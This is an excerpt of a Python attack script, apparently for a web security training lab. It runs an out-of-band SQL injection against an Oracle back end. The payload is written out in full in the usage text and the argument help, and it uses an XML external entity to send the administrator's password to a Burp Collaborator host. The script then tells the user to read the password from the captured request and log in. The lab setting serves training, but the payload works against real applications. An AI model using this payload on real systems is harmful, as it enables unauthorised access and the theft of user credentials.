...
Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d\"1.0\"+encoding%3d\"UTF-8\"%3f><\!DOCTYPE+root+[+<\!ENTITY+%25+remote+SYSTEM+\"http%3a//'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.8gp0rin3h4hsj4b5a7l99rpcv31tpi.burpcollaborator.net/\">+%25remote%3b]>'),'/l')+FROM+dual--"
...
parser.add_argument('-c', '--command', help='Command to run, Example: \'+UNION+SELECT+EXTRACTVALUE(xmltype(\'<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//\'||(SELECT+password+FROM+users+WHERE+username=\'administrator\')||\'.xdeirnd1uj5ka2qy09bsv5eal1rrfg.burpcollaborator.net/">+%25remote%3b]>\'),\'/l\')+FROM+dual--', required=True)
...
def sqli(s, url, command):
    ...
    if args.proxy:
        ...
        print("Check Collaborator Client for HTTP requests and click Request to Collaborator on the HTTP request")
        print("From Host header copy the administrator password and login")
